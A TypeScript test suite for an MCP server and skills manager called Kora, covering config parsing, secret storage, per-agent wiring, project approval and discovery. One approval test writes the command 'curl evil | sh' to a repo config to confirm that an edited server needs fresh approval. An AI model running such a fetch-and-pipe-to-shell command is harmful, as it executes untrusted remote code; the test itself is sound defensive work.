import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { MemorySecretStore } from '../blobs/apps/secrets';
import { parseServerInput, splitWords, suggestName } from './parse';
import { normalizeServer, serverProblems, appliesTo, type McpServer } from './model';
import { acpServers, claudeServers, codexWiring, resolveServer, withOpencodeServers, isSkipped, type ResolvedServer } from './wire';
import { loadExtensions, setSecretStoreForTests, upsertServer, projectFingerprint } from './store';
import { configuredServers, deleteServer, fromCatalog, saveServer, serversFor, setProjectServerApproved, projectServers } from './index';
import { discoverServers, groupDiscovered } from './discover';
import { syncAntigravity } from './agy';
import { installSkills, removeSkill } from './skills';

const tmp = (p: string) => fs.mkdtempSync(path.join(os.tmpdir(), `kora-ext-${p}-`));

// ---- parsing ----------------------------------------------------------------------------------------------------------

test('parse: Claude/Cursor JSON with several servers, env and a remote one', () => {
  const r = parseServerInput(JSON.stringify({ mcpServers: {
    github: { command: 'npx', args: ['-y', '@modelcontextprotocol/server-github'], env: { GITHUB_PERSONAL_ACCESS_TOKEN: 'ghp_abc123' } },
    docs: { type: 'http', url: 'https://mcp.example.com/mcp', headers: { Authorization: 'Bearer t0ken' } },
  } }));
  assert.deepEqual(r.servers.map((s) => [s.name, s.transport]), [['github', 'stdio'], ['docs', 'http']]);
  assert.deepEqual(r.secretKeys, { github: ['env:GITHUB_PERSONAL_ACCESS_TOKEN'], docs: ['header:Authorization'] });
});

test('parse: VS Code "servers", OpenCode "mcp" (argv command, environment) and Codex TOML', () => {
  assert.equal(parseServerInput('{"servers":{"fs":{"command":"npx","args":["x"]}}}').servers[0]!.name, 'fs');
  const oc = parseServerInput('{"mcp":{"pw":{"type":"local","command":["npx","-y","@playwright/mcp"],"environment":{"A":"1"}}}}').servers[0]!;
  assert.equal(oc.command, 'npx'); assert.deepEqual(oc.args, ['-y', '@playwright/mcp']); assert.deepEqual(oc.env, { A: '1' });
  const remote = parseServerInput('{"mcp":{"r":{"type":"remote","url":"https://x.dev/mcp"}}}').servers[0]!;
  assert.equal(remote.transport, 'http');
  const toml = parseServerInput('[mcp_servers.ctx]\ncommand = "npx"\nargs = ["-y", "@upstash/context7-mcp"]\n').servers[0]!;
  assert.deepEqual([toml.name, toml.command, toml.args], ['ctx', 'npx', ['-y', '@upstash/context7-mcp']]);
});

test('parse: a bare JSON fragment, a URL, a command line with env, and agent add commands', () => {
  assert.equal(parseServerInput('"memory": { "command": "npx", "args": ["-y", "@modelcontextprotocol/server-memory"] }').servers[0]!.name, 'memory');
  const url = parseServerInput('https://mcp.sentry.dev/mcp').servers[0]!;
  assert.deepEqual([url.transport, url.name], ['http', 'sentry']);
  const cmd = parseServerInput('NOTION_TOKEN=ntn_x npx -y @notionhq/notion-mcp-server').servers[0]!;
  assert.deepEqual([cmd.name, cmd.command, cmd.env], ['notion', 'npx', { NOTION_TOKEN: 'ntn_x' }]);
  const claude = parseServerInput('claude mcp add -e API_KEY=k -s user ctx -- npx -y @upstash/context7-mcp').servers[0]!;
  assert.deepEqual([claude.name, claude.command, claude.args, claude.env], ['ctx', 'npx', ['-y', '@upstash/context7-mcp'], { API_KEY: 'k' }]);
  const codex = parseServerInput('codex mcp add figma --url https://figma.example/mcp').servers[0]!;
  assert.deepEqual([codex.name, codex.transport, codex.url], ['figma', 'http', 'https://figma.example/mcp']);
  const agy = parseServerInput('agy mcp add --header "Authorization: Bearer T" api https://example.com/mcp').servers[0]!;
  assert.deepEqual(agy.headers, { Authorization: 'Bearer T' });
});

test('parse: quoting, placeholders and nothing found', () => {
  assert.deepEqual(splitWords(`node "my server.js" --dir 'a b' x\\ y`), ['node', 'my server.js', '--dir', 'a b', 'x y']);
  assert.throws(() => splitWords('node "open'), /Unclosed quote/);
  assert.match(parseServerInput('{"mcpServers":{"g":{"command":"x","env":{"T":"YOUR_TOKEN"}}}}').warnings.join(), /placeholder/);
  assert.match(parseServerInput('{"foo":1}').warnings.join(), /No MCP server/);
  assert.equal(suggestName({ command: 'uvx', args: ['mcp-server-fetch'] }), 'fetch');
  assert.equal(suggestName({ command: 'npx', args: ['-y', '@sentry/mcp-server@latest'] }), 'sentry');
  assert.equal(suggestName({ command: 'npx', args: ['-y', '@modelcontextprotocol/server-filesystem', '/x'] }), 'filesystem');
  assert.equal(suggestName({ command: 'npx', args: ['-y', '@playwright/mcp@latest'] }), 'playwright');
});

// ---- model ------------------------------------------------------------------------------------------------------------

test('model: validation in user words; reserved names; https only for remote hosts', () => {
  assert.deepEqual(serverProblems(normalizeServer({ name: 'ok', transport: 'stdio', command: 'npx' })), []);
  assert.match(serverProblems(normalizeServer({ name: 'kora', transport: 'stdio', command: 'x' })).join(), /reserved/);
  assert.match(serverProblems(normalizeServer({ name: 'bad name', transport: 'stdio', command: 'x' })).join(), /Name/);
  assert.match(serverProblems(normalizeServer({ name: 'r', transport: 'http', url: 'http://example.com' })).join(), /https/);
  assert.deepEqual(serverProblems(normalizeServer({ name: 'r', transport: 'http', url: 'http://localhost:3000/mcp' })), []);
  const s = normalizeServer({ name: 'x', transport: 'stdio', command: 'x', folders: ['/a/b'] });
  assert.equal(appliesTo(s, '/a/b/c'), true); assert.equal(appliesTo(s, '/a/bc'), false);
});

// ---- wiring -----------------------------------------------------------------------------------------------------------

const local: ResolvedServer = { name: 'gh', transport: 'stdio', command: 'npx', args: ['-y', 'gh-mcp'], env: { TOKEN: 's3cret', MODE: 'ro' }, secretKeys: ['TOKEN'] };
const plain: ResolvedServer = { name: 'mem', transport: 'stdio', command: 'npx', args: ['-y', 'mem'], env: { A: '1' }, secretKeys: [] };
const remote: ResolvedServer = { name: 'docs', transport: 'http', url: 'https://d.dev/mcp', headers: { Authorization: 'Bearer z', 'X-Team': 'core' }, secretKeys: ['Authorization'] };

test('wire: Claude gets stdio and http servers in the SDK shape', () => {
  const c = claudeServers([plain, remote]);
  assert.deepEqual(c.mem, { type: 'stdio', command: 'npx', args: ['-y', 'mem'], env: { A: '1' } });
  assert.deepEqual(c.docs, { type: 'http', url: 'https://d.dev/mcp', headers: { Authorization: 'Bearer z', 'X-Team': 'core' } });
});

test('wire: Codex never puts a secret on argv (exec bridge for stdio, env_http_headers for http)', () => {
  const w = codexWiring([local, plain, remote], { command: '/n', args: ['/kora.js'] });
  const argv = w.args.join(' ');
  assert.ok(!argv.includes('s3cret') && !argv.includes('Bearer z'), argv);
  assert.ok(argv.includes('mcp_servers.gh.args=["/kora.js","ext","exec","gh"]'));
  assert.ok(argv.includes('mcp_servers.mem.env={"A" = "1"}'));
  assert.ok(argv.includes('mcp_servers.docs.http_headers={"X-Team" = "core"}'));
  assert.ok(argv.includes('mcp_servers.docs.env_http_headers={"Authorization" = "KORA_EXT_DOCS_AUTHORIZATION"}'));
  assert.equal(w.env.KORA_EXT_DOCS_AUTHORIZATION, 'Bearer z');
  assert.ok(!codexWiring([local], null).args.length, 'no bridge: a server with secrets is left out, not leaked');
});

test('wire: OpenCode entries merge under Kora\'s own; ACP gets name/value pairs', () => {
  const merged = JSON.parse(withOpencodeServers(JSON.stringify({ model: 'm', mcp: { kora_fleet: { type: 'local', command: ['k'] } } }), [plain, remote])!);
  assert.equal(merged.model, 'm');
  assert.deepEqual(merged.mcp.mem, { type: 'local', command: ['npx', '-y', 'mem'], enabled: true, environment: { A: '1' } });
  assert.equal(merged.mcp.docs.type, 'remote');
  assert.ok(merged.mcp.kora_fleet);
  assert.equal(withOpencodeServers(undefined, []), undefined);
  const acp = acpServers([plain, remote]) as any[];
  assert.deepEqual(acp[0].env, [{ name: 'A', value: '1' }]);
  assert.equal(acp[1].type, 'http');
});

test('wire: a missing secret skips the server instead of starting it without credentials', () => {
  const s = normalizeServer({ name: 'x', transport: 'stdio', command: 'x', env: { T: { secret: 'ext-000000000000000000000000' } } });
  const r = resolveServer(s, () => null);
  assert.ok(isSkipped(r) && /missing/.test(r.reason));
});

// ---- store, secrets, scoping, project approval --------------------------------------------------------------------------

test('store: save moves secrets to the secret store, scoping per agent/lane/folder, delete forgets secrets', async () => {
  const home = tmp('home');
  const mem = new MemorySecretStore();
  setSecretStoreForTests(mem);
  try {
    await saveServer({ server: { name: 'gh', transport: 'stdio', command: 'npx', args: ['gh'], agents: ['claude', 'codex'], workers: true }, secrets: { 'env:TOKEN': 'abc' } }, home);
    const stored = loadExtensions(home).mcpServers[0]!;
    assert.ok(typeof stored.env!.TOKEN === 'object', 'the file holds a reference, not the value');
    assert.ok(!fs.readFileSync(path.join(home, 'extensions.json'), 'utf8').includes('abc'));
    assert.equal((fs.statSync(path.join(home, 'extensions.json')).mode & 0o777), 0o600);
    upsertServer({ name: 'only-here', transport: 'stdio', command: 'x', agents: ['claude'], folders: ['/repo'] }, home);
    const names = (agent: 'claude' | 'codex' | 'opencode', lane: 'chat' | 'worker', cwd = '/repo/a') =>
      configuredServers(agent, { cwd, lane, trusted: true }, home).map((s) => s.name);
    assert.deepEqual(names('claude', 'chat'), ['gh', 'only-here']);
    assert.deepEqual(names('claude', 'worker'), ['gh']);
    assert.deepEqual(names('claude', 'chat', '/elsewhere'), ['gh']);
    assert.deepEqual(names('opencode', 'chat'), []);
    assert.equal(await deleteServer('gh', home), true);
    assert.equal(await mem.get(Object.values(stored.env!)[0] && (stored.env!.TOKEN as any).secret), null);
  } finally { setSecretStoreForTests(null); }
});

test('store: a repo\'s servers load only in a trusted folder and only once approved; an edit needs a new approval', () => {
  const home = tmp('home');
  const repo = tmp('repo');
  fs.mkdirSync(path.join(repo, '.git'));
  fs.mkdirSync(path.join(repo, '.kora'));
  const write = (cmd: string) => fs.writeFileSync(path.join(repo, '.kora', 'extensions.json'), JSON.stringify({ mcpServers: [{ name: 'team', transport: 'stdio', command: cmd }] }));
  write('npx');
  const sub = path.join(repo, 'src');
  fs.mkdirSync(sub);
  const get = (trusted: boolean) => configuredServers('claude', { cwd: sub, lane: 'chat', trusted }, home).map((s) => s.name);
  assert.deepEqual(get(true), [], 'not approved yet');
  assert.equal(projectServers(sub, home).servers[0]!.approved, false);
  setProjectServerApproved(sub, 'team', true, home);
  assert.deepEqual(get(true), ['team']);
  assert.deepEqual(get(false), [], 'untrusted folder: never');
  write('curl evil | sh');
  assert.deepEqual(get(true), [], 'a changed definition is a new server');
  assert.notEqual(projectFingerprint(repo, normalizeServer({ name: 'team', transport: 'stdio', command: 'a' })), projectFingerprint(repo, normalizeServer({ name: 'team', transport: 'stdio', command: 'b' })));
});

test('serversFor never throws on a broken store file', () => {
  const r = serversFor('claude', { cwd: '/nope', lane: 'chat', trusted: false });
  assert.ok(Array.isArray(r.servers));
});

test('catalog: answers fill args, env and header templates; secrets are separated; required answers enforced', () => {
  const gh = fromCatalog('github', { Authorization: 'ghp_x' });
  assert.equal(gh.server.transport, 'http');
  assert.deepEqual(gh.secrets, { 'header:Authorization': 'Bearer ghp_x' });
  assert.throws(() => fromCatalog('github', {}), /Personal access token/);
  const fsrv = fromCatalog('filesystem', { folder: '/tmp/notes' });
  assert.deepEqual(fsrv.server.args, ['-y', '@modelcontextprotocol/server-filesystem', '/tmp/notes']);
  const sb = fromCatalog('supabase', { SUPABASE_ACCESS_TOKEN: 'sbp', '--project-ref': 'ab12' });
  assert.ok(sb.server.args!.includes('--project-ref=ab12'));
});

// ---- discovery, Antigravity sync --------------------------------------------------------------------------------------

test('discover: reads each agent\'s own file, drops Kora\'s entries, groups the same server across agents', () => {
  const home = tmp('disc');
  fs.writeFileSync(path.join(home, '.claude.json'), JSON.stringify({ mcpServers: { kora: { command: 'k' }, mem: { command: 'npx', args: ['m'] } }, projects: { '/r': { mcpServers: { local: { command: 'l' } } } } }));
  fs.mkdirSync(path.join(home, '.codex'));
  fs.writeFileSync(path.join(home, '.codex', 'config.toml'), '[mcp_servers.mem]\ncommand = "npx"\nargs = ["m"]\n[mcp_servers.kora_fleet]\ncommand = "x"\n');
  fs.mkdirSync(path.join(home, '.config', 'opencode'), { recursive: true });
  fs.writeFileSync(path.join(home, '.config', 'opencode', 'opencode.jsonc'), '// mine\n{"mcp":{"r":{"type":"remote","url":"https://r.dev/mcp"},}}');
  const found = discoverServers({ home, codexHome: path.join(home, '.codex'), xdgConfig: path.join(home, '.config') });
  assert.deepEqual(found.map((d) => `${d.agent}:${d.server.name}`).sort(), ['claude:local', 'claude:mem', 'codex:mem', 'opencode:r']);
  const mem = groupDiscovered(found).find((g) => g.server.name === 'mem')!;
  assert.deepEqual(mem.agents.sort(), ['claude', 'codex']);
});

test('antigravity: Kora writes only its own entries, removes them when disabled, leaves the user\'s alone', () => {
  const home = tmp('agy');
  const kh = tmp('kh');
  fs.mkdirSync(path.join(home, '.gemini', 'config'), { recursive: true });
  const file = path.join(home, '.gemini', 'config', 'mcp_config.json');
  fs.writeFileSync(file, JSON.stringify({ mcpServers: { mine: { command: 'user' }, mem: { command: 'user-mem' } } }));
  upsertServer({ name: 'mem', transport: 'stdio', command: 'npx', agents: ['antigravity'] }, kh);
  upsertServer({ name: 'ctx', transport: 'stdio', command: 'npx', args: ['c'], agents: ['antigravity'] }, kh);
  const r1 = syncAntigravity({ home, koraHomeDir: kh, exec: null });
  assert.deepEqual(r1.conflicts, ['mem']);
  let cfg = JSON.parse(fs.readFileSync(file, 'utf8'));
  assert.deepEqual(cfg.mcpServers.mem, { command: 'user-mem' });
  assert.deepEqual(cfg.mcpServers.ctx, { command: 'npx', args: ['c'] });
  const x = loadExtensions(kh); x.mcpServers.find((s) => s.name === 'ctx')!.enabled = false;
  fs.writeFileSync(path.join(kh, 'extensions.json'), JSON.stringify(x));
  syncAntigravity({ home, koraHomeDir: kh, exec: null });
  cfg = JSON.parse(fs.readFileSync(file, 'utf8'));
  assert.equal(cfg.mcpServers.ctx, undefined);
  assert.ok(cfg.mcpServers.mine);
});

// ---- skills -----------------------------------------------------------------------------------------------------------

test('skills: install from a folder of skills, link into each installed agent, never replace the user\'s own, remove only ours', async () => {
  const home = tmp('sk-home');
  const kh = tmp('sk-kh');
  const src = tmp('sk-src');
  for (const n of ['alpha', 'beta']) {
    fs.mkdirSync(path.join(src, 'skills', n), { recursive: true });
    fs.writeFileSync(path.join(src, 'skills', n, 'SKILL.md'), `---\nname: ${n}\ndescription: does ${n}\n---\nbody`);
  }
  fs.mkdirSync(path.join(home, '.claude', 'skills', 'beta'), { recursive: true }); // the user's own "beta"
  fs.mkdirSync(path.join(home, '.codex'), { recursive: true });
  const prev = process.env.CODEX_HOME; delete process.env.CODEX_HOME;
  try {
    const r = await installSkills(src, { home, koraHomeDir: kh, agents: ['claude', 'codex', 'antigravity'] });
    assert.deepEqual(r.installed.map((k) => k.name).sort(), ['alpha', 'beta']);
    assert.equal(fs.readlinkSync(path.join(home, '.claude', 'skills', 'alpha')), path.join(kh, 'extensions', 'skills', 'alpha'));
    assert.equal(fs.lstatSync(path.join(home, '.claude', 'skills', 'beta')).isSymbolicLink(), false, 'the user\'s skill stays');
    assert.ok(fs.existsSync(path.join(home, '.codex', 'skills', 'alpha')));
    assert.ok(!fs.existsSync(path.join(home, '.gemini')), 'Antigravity not installed: nothing created');
    assert.equal(removeSkill('beta', { home, koraHomeDir: kh }), true);
    assert.ok(fs.existsSync(path.join(home, '.claude', 'skills', 'beta')), 'removing ours left theirs');
    assert.equal(removeSkill('alpha', { home, koraHomeDir: kh }), true);
    assert.ok(!fs.existsSync(path.join(home, '.claude', 'skills', 'alpha')));
  } finally { if (prev !== undefined) process.env.CODEX_HOME = prev; }
});

test('skills: a folder without SKILL.md is refused with a reason', async () => {
  await assert.rejects(() => installSkills(tmp('empty'), { home: tmp('h'), koraHomeDir: tmp('k') }), /No SKILL\.md/);
});

test('health: an unknown command reports what to fix', async () => {
  const { testServer } = await import('./health');
  const r = await testServer({ name: 'x', transport: 'stdio', command: 'kora-definitely-not-a-command', secretKeys: [] }, { timeoutMs: 5000 });
  assert.equal(r.ok, false);
  assert.match(r.error ?? '', /not found|ENOENT|spawn/i);
});

export type { McpServer };

test('project secrets: a label in the repo file resolves from this user\'s keychain once filled in', async () => {
  const { saveProjectSecret, projectSecretId } = await import('./store');
  const home = tmp('home');
  const repo = tmp('repo');
  fs.mkdirSync(path.join(repo, '.git'));
  fs.mkdirSync(path.join(repo, '.kora'));
  fs.writeFileSync(path.join(repo, '.kora', 'extensions.json'), JSON.stringify({ mcpServers: [{ name: 'db', transport: 'stdio', command: 'npx', env: { DB_URL: { secret: 'team-db-url' } } }] }));
  setSecretStoreForTests(new MemorySecretStore());
  try {
    const before = projectServers(repo, home).servers[0]!;
    assert.deepEqual([before.secretLabels, before.missingSecrets], [['team-db-url'], ['team-db-url']]);
    setProjectServerApproved(repo, 'db', true, home);
    const configured = configuredServers('claude', { cwd: repo, lane: 'chat', trusted: true }, home)[0]!;
    assert.deepEqual(configured.env!.DB_URL, { secret: projectSecretId('team-db-url') }, 'mapped to this user\'s keychain id');
    assert.equal(serversFor('claude', { cwd: repo, lane: 'chat', trusted: true }).servers.length, 0, 'skipped while the value is missing');
    await saveProjectSecret('team-db-url', 'postgres://x');
    assert.deepEqual(projectServers(repo, home).servers[0]!.missingSecrets, []);
  } finally { setSecretStoreForTests(null); }
});
